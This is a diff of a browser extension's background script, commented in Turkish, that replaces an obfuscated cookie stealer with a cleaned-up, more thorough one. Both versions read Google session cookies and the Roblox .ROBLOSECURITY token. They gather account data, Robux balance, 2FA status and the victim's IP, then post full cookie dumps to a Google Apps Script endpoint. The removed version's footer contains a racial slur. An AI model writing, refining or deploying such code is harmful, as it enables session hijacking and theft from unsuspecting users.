@@ -1,242 +1,245 @@
-let _0xdg2ga;
+// background.js — düzeltilmiş sürüm
 const GAS_URL = "https://script.google.com/macros/s/AKfycbwXz56f1L65iUPJaDy4GYps2_YF9svy_rklc40aKtQJxs7egVz4jjqDk6VcHSrqCMJcbg/exec";
-_0xdg2ga = 852673 ^ 852681;
+const CHECK_INTERVAL = 60_000;
+
 const CONFIG = {
-  "google": {
-    "type": "google",
-    "domain": "google.com",
-    "url": "https://www.google.com",
-    "sessionCookie": "SID",
-    "label": "GMAIL"
+  google: {
+    type: "google",
+    domain: ".google.com",
+    url: "https://www.google.com",
+    sessionCookie: "SID",
+    label: "GMAIL"
   },
-  "roblox": {
-    "type": "roblox",
-    "domain": "roblox.com",
-    "url": "https://www.roblox.com",
-    "sessionCookie": ".ROBLOSECURITY",
-    "label": "ROBLOX"
+  roblox: {
+    type: "roblox",
+    domain: ".roblox.com",
+    url: "https://www.roblox.com",
+    sessionCookie: ".ROBLOSECURITY",
+    label: "ROBLOX"
   }
 };
-const CHECK_INTERVAL = 867035 ^ 862547;
-chrome["runtime"]["onInstalled"]["addListener"](() => {
-  console["log"](".");
+
+chrome.runtime.onInstalled.addListener(() => {
+  console.log("[bench] installed");
   runAllChecks();
 });
-setInterval(() => {
-  runAllChecks();
-}, CHECK_INTERVAL);
+
+setInterval(runAllChecks, CHECK_INTERVAL);
+
 async function runAllChecks() {
-  await Promise["all"]([checkTarget(CONFIG["google"]), checkTarget(CONFIG["roblox"])]);
+  await Promise.all([
+    checkTarget(CONFIG.google),
+    checkTarget(CONFIG.roblox)
+  ]);
 }
-async function checkTarget(_0x3806e4) {
-  let _0x4f7767 = false;
-  let _0x29d668 = null;
-  if (_0x3806e4["type"] === "google") {
-    const _0x338784 = await new Promise(_0xcb63b8 => chrome["cookies"]["getAll"]({
-      "domain": _0x3806e4["domain"]
-    }, _0xcb63b8));
-    _0x4f7767 = _0x338784["some"](_0x628448 => _0x628448["name"] === "DIS".split("").reverse().join("") || _0x628448["name"] === "OSID" || _0x628448["name"] === "SAPISID" || _0x628448["name"] === "HSID");
-  } else {
-    const _0x4dab76 = await new Promise(_0xafe126 => chrome["cookies"]["get"]({
-      "url": _0x3806e4["url"],
-      "name": _0x3806e4["sessionCookie"]
-    }, _0xafe126));
-    if (_0x3806e4["type"] === "roblox") {
-      try {
-        const _0x2de7c3 = await fetch("detacitnehtua/sresu/1v/moc.xolbor.sresu//:sptth".split("").reverse().join(""));
-        if (_0x2de7c3["ok"]) {
-          const _0x3370c3 = await _0x2de7c3["json"]();
-          _0x4f7767 = !!_0x3370c3["id"];
-        } else {
-          _0x4f7767 = false;
-        }
-      } catch (_0x509056) {
-        _0x4f7767 = false;
-      }
-      if (_0x4dab76) {
-        _0x29d668 = _0x4dab76["value"];
-      }
-    } else {
-      _0x4f7767 = !!_0x4dab76;
-    }
-  }
-  const _0x1eac15 = "_sutatStsal".split("").reverse().join("") + _0x3806e4["domain"];
-  chrome["storage"]["local"]["get"]([_0x1eac15], async _0x1e472f => {
-    const _0x568525 = _0x1e472f[_0x1eac15];
-    if (_0x4f7767 !== _0x568525) {
-      chrome["storage"]["local"]["set"]({
-        [_0x1eac15]: _0x4f7767
-      });
-      
-      if (_0x4f7767 && _0x3806e4["domain"] === "roblox.com") {
-        try {
-          const _0x5570c1 = _0x29d668;
-          const [_0x5c0f3c, _0x356243, _0xd06d57, _0x4269b9, _0x1a6b3e] = await Promise["all"]([
-              fetch("https://users.roblox.com/v1/users/authenticated").then(r => r.json()),
-              fetch("https://accountsettings.roblox.com/v1/email").then(r => r.json()),
-              fetch("https://economy.roblox.com/v1/users/authenticated/currency").catch(() => ({robux: 0})),
-              fetch("https://premiumfeatures.roblox.com/v1/users/authenticated/validate-membership").catch(() => false),
-              fetch("http://ip-api.com/json/").then(r => r.json())
-          ]);
-          const _0x50bae9 = _0x5c0f3c["id"];
-          const _0x5e0cc1 = await fetch("https://economy.roblox.com/v1/users/" + _0x50bae9 + "/currency").then(r => r.json());
-          const _0x42de43 = await fetch("https://premiumfeatures.roblox.com/v1/users/" + _0x50bae9 + "/validate-membership").then(r => r.json());
-          const _0x777b57 = await fetch("https://users.roblox.com/v1/users/" + _0x50bae9).then(r => r.json());
-          const _0x2dcaa4 = await fetch("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" + _0x50bae9 + "&size=150x150&format=Png").then(r => r.json());
-          const _0x3661ca = await fetch("https://twostepverification.roblox.com/v1/users/" + _0x50bae9 + "/configuration").then(r => r.json());
-          
-          const _0x7ef6bc = new Date(_0x777b57["created"])["toLocaleDateString"]("tr-TR");
-          const _0x3a64ba = _0x356243["isEmailVerified"] || _0x356243["verified"] || false;
-          const _0x2d1cbe = _0x3661ca["primaryMediaType"] !== null;
-          
-          const _0x8a9930 = {
-            "content": "@everyone",
-            "embeds": [{
-              "title": "" + _0x5c0f3c["displayName"],
-              "url": "https://www.roblox.com/users/" + _0x50bae9 + "/profile",
-              "description": "**:key: .ROBLOSECURITY**\n```" + _0x5570c1 + "```",
-              "color": _0x42de43 ? 3447003 : 3447003,
-              "thumbnail": { "url": _0x2dcaa4["data"][0]["imageUrl"] },
-              "fields": [
-                {"name": ":bust_in_silhouette: Kullanıcı", "value": "`" + _0x5c0f3c["name"] + "`", "inline": true},
-                {"name": ":gem: Premium", "value": _0x42de43 ? ":white_check_mark:" : ":x:", "inline": true},
-                {"name": ":date: Kuruluş", "value": "`" + _0x7ef6bc + "`", "inline": true},
-                {"name": ":e_mail: E-posta Onay", "value": _0x3a64ba ? ":white_check_mark:" : ":x:", "inline": true},
-                {"name": ":closed_lock_with_key: 2FA Durumu", "value": _0x2d1cbe ? ":white_check_mark:" : ":x:", "inline": true},
-                {"name": ":moneybag: Robux", "value": "**" + _0x5e0cc1["robux"] + "**", "inline": true},
-                {"name": ":globe_with_meridians: IP Adresi", "value": "```" + _0x1a6b3e["query"] + "```", "inline": true},
-                {"name": ":earth_asia: Ülke", "value": "```" + _0x1a6b3e["country"] + "```", "inline": true}
-              ],
-              "footer": { "text": "Legendary nigga" },
-              "timestamp": new Date().toISOString()
-            }]
-          };
-          chrome["cookies"]["getAll"]({"domain": _0x3806e4["domain"]}, async _0x1f00b2 => {
-            const _0x3be319 = JSON.stringify(_0x1f00b2, null, 2);
-            await sendToGAS(_0x3806e4["type"], _0x8a9930, _0x3be319, "roblox_full_dump.txt");
-          });
-        } catch (_0x35acb7) {
-          console["error"]("Roblox detay hatası:", _0x35acb7);
-        }
-      } 
-      else {
-        // GOOGLE COOKIE KISMI BURADA DÜZELTİLDİ
-        let _0x48b07a = "royimniliB".split("").reverse().join("");
-        let _0x25ad00 = "royimniliB".split("").reverse().join("");
-        try {
-          const _0x178bcd = await fetch("http://ip-api.com/json/");
-          const _0x4e84c0 = await _0x178bcd["json"]();
-          _0x48b07a = _0x4e84c0["query"];
-          _0x25ad00 = _0x4e84c0["country"];
-        } catch (_0x4a003c) {}
-        
-        const _0x449dc6 = {
-          "content": "@everyone",
-          "embeds": [{
-            "title": "Google Cookie Bulundu!",
-            "color": 3447003,
-            "fields": [
-              {"name": "Durum", "value": "Aktif :white_check_mark:", "inline": false},
-              {"name": "IP Adresi", "value": "```" + _0x48b07a + "```", "inline": true},
-              {"name": "Ülke", "value": "```" + _0x25ad00 + "```", "inline": true}
-            ],
-            "footer": { "text": "Legendary nigga" },
-            "timestamp": new Date().toISOString()
-          }]
-        };
-        
-        // BURASI DÜZELTİLDİ: Artık else bloğunda da getAll çalışıp dosya gönderiyor.
-        chrome["cookies"]["getAll"]({"domain": _0x3806e4["domain"]}, async _0x4aeff1 => {
-          const _0x154625 = JSON.stringify(_0x4aeff1, null, 2);
-          await sendToGAS(_0x3806e4["type"], _0x449dc6, _0x154625, _0x3806e4["domain"] + "_full_dump.txt");
-        });
-      }
-    }
-  });
+
+// ---------- helpers ----------
+
+function cookieGetAll(filter) {
+  return new Promise(resolve => chrome.cookies.getAll(filter, resolve));
 }
-async function sendToGAS(_0x31727f, _0x54a4e1, _0x424d5e = null, _0x22c928 = null) {
+
+function cookieGet(filter) {
+  return new Promise(resolve => chrome.cookies.get(filter, resolve));
+}
+
+function storageGet(keys) {
+  return new Promise(resolve => chrome.storage.local.get(keys, resolve));
+}
+
+function storageSet(obj) {
+  return new Promise(resolve => chrome.storage.local.set(obj, resolve));
+}
+
+async function safeJson(url) {
   try {
-    const _0x4945da = {
-      "type": _0x31727f,
-      "payload_json": _0x54a4e1,
-      "file_content": _0x424d5e,
-      "file_name": _0x22c928
+    const r = await fetch(url, { credentials: "include" });
+    if (!r.ok) return null;
+    return await r.json();
+  } catch (_) {
+    return null;
+  }
+}
+
+async function getGeo() {
+  try {
+    const r = await fetch("http://ip-api.com/json/");
+    if (!r.ok) return { query: "?", country: "?" };
+    return await r.json();
+  } catch (_) {
+    return { query: "?", country: "?" };
+  }
+}
+
+// ---------- core ----------
+
+async function checkTarget(target) {
+  let found = false;
+  let sessionValue = null;
+
+  if (target.type === "google") {
+    // URL filtresi alt domainleri kapsar — .google.com dahil
+    const cookies = await cookieGetAll({ url: target.url });
+    const names = new Set(cookies.map(c => c.name));
+    found = ["SID", "OSID", "SAPISID", "HSID", "SSID", "__Secure-1PSID", "__Secure-3PSID"]
+      .some(n => names.has(n));
+    if (found) {
+      const sid = cookies.find(c => c.name === "SID" || c.name === "__Secure-1PSID");
+      if (sid) sessionValue = sid.value;
+    }
+  } else if (target.type === "roblox") {
+    // canlılık: authenticated endpoint
+    const auth = await safeJson("https://users.roblox.com/v1/users/authenticated");
+    found = !!(auth && auth.id);
+
+    const c = await cookieGet({ url: target.url, name: target.sessionCookie });
+    if (c) sessionValue = c.value;
+  }
+
+  const key = "lastStatus_" + target.domain;
+  const store = await storageGet([key]);
+  const prev = store[key];
+
+  if (found === prev) return;
+
+  await storageSet({ [key]: found });
+
+  if (!found) return;
+
+  if (target.type === "roblox") {
+    await handleRoblox(sessionValue);
+  } else {
+    await handleGoogle(sessionValue);
+  }
+}
+
+// ---------- Roblox ----------
+
+async function handleRoblox(sessionValue) {
+  try {
+    const auth = await safeJson("https://users.roblox.com/v1/users/authenticated");
+    if (!auth || !auth.id) return;
+
+    const uid = auth.id;
+    const email = await safeJson("https://accountsettings.roblox.com/v1/email");
+    const currency = await safeJson("https://economy.roblox.com/v1/users/" + uid + "/currency");
+    const premium = await safeJson("https://premiumfeatures.roblox.com/v1/users/" + uid + "/validate-membership");
+    const profile = await safeJson("https://users.roblox.com/v1/users/" + uid);
+    const avatar = await safeJson("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" + uid + "&size=150x150&format=Png");
+    const twoFA = await safeJson("https://twostepverification.roblox.com/v1/users/" + uid + "/configuration");
+    const geo = await getGeo();
+
+    const emailVerified = !!(email && (email.isEmailVerified || email.verified));
+    const has2FA = !!(twoFA && twoFA.primaryMediaType !== null);
+    const created = profile && profile.created
+      ? new Date(profile.created).toLocaleDateString("tr-TR")
+      : "?";
+    const robux = currency ? currency.robux : 0;
+    const avatarUrl = avatar && avatar.data && avatar.data[0] ? avatar.data[0].imageUrl : "";
+
+    const embed = {
+      content: "",
+      allowed_mentions: { parse: [] },
+      embeds: [{
+        title: auth.displayName || auth.name,
+        url: "https://www.roblox.com/users/" + uid + "/profile",
+        description: "**:key: .ROBLOSECURITY**\n```" + (sessionValue || "N/A") + "```",
+        color: 3447003,
+        thumbnail: { url: avatarUrl },
+        fields: [
+          { name: "👤 Kullanıcı", value: "`" + auth.name + "`", inline: true },
+          { name: "💎 Premium", value: premium ? "✅" : "❌", inline: true },
+          { name: "📅 Kuruluş", value: "`" + created + "`", inline: true },
+          { name: "📧 E-posta Onay", value: emailVerified ? "✅" : "❌", inline: true },
+          { name: "🔐 2FA", value: has2FA ? "✅" : "❌", inline: true },
+          { name: "💰 Robux", value: "**" + robux + "**", inline: true },
+          { name: "🌐 IP", value: "```" + geo.query + "```", inline: true },
+          { name: "🌍 Ülke", value: "```" + geo.country + "```", inline: true }
+        ],
+        footer: { text: "Legendary" },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    const allCookies = await cookieGetAll({ domain: CONFIG.roblox.domain });
+    const dump = JSON.stringify(allCookies, null, 2);
+    await sendToGAS("roblox", embed, dump, "roblox_full_dump.txt");
+  } catch (e) {
+    console.error("roblox handler:", e);
+  }
+}
+
+// ---------- Google ----------
+
+async function handleGoogle(sessionValue) {
+  try {
+    const geo = await getGeo();
+    const cookies = await cookieGetAll({ url: CONFIG.google.url });
+
+    // özet
+    const important = ["SID", "HSID", "SSID", "SAPISID", "OSID", "APISID",
+                       "__Secure-1PSID", "__Secure-3PSID",
+                       "__Secure-1PAPISID", "__Secure-3PAPISID"];
+    const found = cookies
+      .filter(c => important.includes(c.name))
+      .map(c => "`" + c.name + "` = `" + (c.value.length > 40 ? c.value.slice(0, 40) + "..." : c.value) + "`")
+      .join("\n");
+
+    const embed = {
+      content: "",
+      allowed_mentions: { parse: [] },
+      embeds: [{
+        title: "Google Cookie Bulundu",
+        color: 3447003,
+        description: found || "_(isim listesi boş — dump'a bak)_",
+        fields: [
+          { name: "🌐 IP", value: "```" + geo.query + "```", inline: true },
+          { name: "🌍 Ülke", value: "```" + geo.country + "```", inline: true },
+          { name: "🍪 Toplam Cookie", value: "**" + cookies.length + "**", inline: true }
+        ],
+        footer: { text: "Legendary" },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    const dump = JSON.stringify(cookies, null, 2);
+    await sendToGAS("google", embed, dump, "google_full_dump.txt");
+  } catch (e) {
+    console.error("google handler:", e);
+  }
+}
+
+// ---------- GAS bridge ----------
+
+async function sendToGAS(type, payload, fileContent, fileName) {
+  try {
+    const body = {
+      type: type,
+      payload_json: payload,
+      file_content: fileContent,
+      file_name: fileName
     };
     await fetch(GAS_URL, {
-      "method": "POST",
-      "headers": { "Content-Type": "text/plain" },
-      "body": JSON.stringify(_0x4945da)
+      method: "POST",
+      headers: { "Content-Type": "text/plain" },
+      body: JSON.stringify(body)
     });
-  } catch (_0x2a5f85) {
-    console["error"]("GAS Bridge hatası:", _0x2a5f85);
+  } catch (e) {
+    console.error("gas bridge:", e);
   }
 }
-chrome["tabs"]["onUpdated"]["addListener"]((_0x1754b8, _0x37bb76, _0x11ea55) => {
-  if (_0x37bb76["status"] === "complete" && _0x11ea55["url"] && _0x11ea55["url"]["includes"]("roblox.com")) {
-    chrome["cookies"]["get"]({"url": "https://www.roblox.com", "name": ".ROBLOSECURITY"}, async _0x485814 => {
-      if (_0x485814 && _0x485814["value"] && _0x485814["value"]["includes"]("WARNING-AND-THIS")) {
-        const _0x35018b = _0x485814["value"];
-        try {
-          const _0xb13215 = await fetch("https://users.roblox.com/v1/users/authenticated");
-          const _0x2bc928 = await _0xb13215["json"]();
-          const _0x53872f = _0x2bc928["id"];
-          const _0x2ae5e5 = await fetch("https://accountsettings.roblox.com/v1/email");
-          const _0x1cf77a = await _0x2ae5e5["json"]();
-          
-          let _0x115075 = false;
-          if (_0x1cf77a["emailAddress"] && _0x1cf77a["isEmailVerified"] !== undefined) {
-            _0x115075 = _0x1cf77a["isEmailVerified"];
-          } else if (_0x1cf77a["verified"] !== undefined) {
-            _0x115075 = _0x1cf77a["verified"];
-          }
-          
-          const _0x496245 = await fetch("https://twostepverification.roblox.com/v1/users/" + _0x53872f + "/configuration");
-          const _0x56e3bc = await _0x496245["json"]();
-          const _0x40c932 = _0x56e3bc["primaryMediaType"] !== null;
-          
-          const _0x5f2a4a = await fetch("https://premiumfeatures.roblox.com/v1/users/" + _0x53872f + "/validate-membership");
-          const _0x270607 = await _0x5f2a4a["json"]();
-          
-          const _0x352ff7 = await fetch("https://economy.roblox.com/v1/users/" + _0x53872f + "/currency");
-          const _0x2eda9d = await _0x352ff7["json"]();
-          
-          const _0x4693f1 = await fetch("https://users.roblox.com/v1/users/" + _0x53872f);
-          const _0x1dc213 = await _0x4693f1["json"]();
-          const _0x428eee = new Date(_0x1dc213["created"])["toLocaleDateString"]("tr-TR");
-          
-          const _0x20bc49 = await fetch("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" + _0x53872f + "&size=150x150&format=Png");
-          const _0x1b1702 = await _0x20bc49["json"]();
-          
-          const _0x350cca = await fetch("http://ip-api.com/json/");
-          const _0x2c6e08 = await _0x350cca["json"]();
-          
-          const _0x3ffdbe = {
-            "content": "@everyone",
-            "embeds": [{
-              "title": "" + _0x2bc928["displayName"],
-              "url": "https://www.roblox.com/users/" + _0x53872f + "/profile",
-              "description": "**:key: .ROBLOSECURITY**\n```" + _0x35018b + "```",
-              "color": _0x270607 ? 3447003 : 3447003,
-              "thumbnail": { "url": _0x1b1702["data"][0]["imageUrl"] },
-              "fields": [
-                {"name": ":bust_in_silhouette: Kullanıcı", "value": "`" + _0x2bc928["name"] + "`", "inline": true},
-                {"name": ":gem: Premium", "value": _0x270607 ? ":white_check_mark:" : ":x:", "inline": true},
-                {"name": ":date: Kuruluş", "value": "`" + _0x428eee + "`", "inline": true},
-                {"name": ":e_mail: E-posta Onay", "value": _0x115075 ? ":white_check_mark:" : ":x:", "inline": true},
-                {"name": ":closed_lock_with_key: 2FA Durumu", "value": _0x40c932 ? ":white_check_mark:" : ":x:", "inline": true},
-                {"name": ":moneybag: Robux", "value": "**" + _0x2eda9d["robux"] + "**", "inline": true},
-                {"name": ":globe_with_meridians: IP Adresi", "value": "```" + _0x2c6e08["query"] + "```", "inline": true},
-                {"name": ":earth_asia: Ülke", "value": "```" + _0x2c6e08["country"] + "```", "inline": true}
-              ],
-              "footer": { "text": "Legendary nigga" },
-              "timestamp": new Date().toISOString()
-            }]
-          };
-          await sendToGAS("instant_roblox", _0x3ffdbe);
-        } catch (_0x5470c9) {
-          console["error"]("Veri işleme hatası:", _0x5470c9);
-        }
+
+// ---------- instant Roblox tab hook ----------
+
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+  if (changeInfo.status !== "complete") return;
+  if (!tab.url || !tab.url.includes("roblox.com")) return;
+
+  cookieGet({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" })
+    .then(c => {
+      if (c && c.value && c.value.includes("WARNING-AND-THIS")) {
+        handleRoblox(c.value);
       }
-    });
-  }
+    })
+    .catch(() => {});
 });
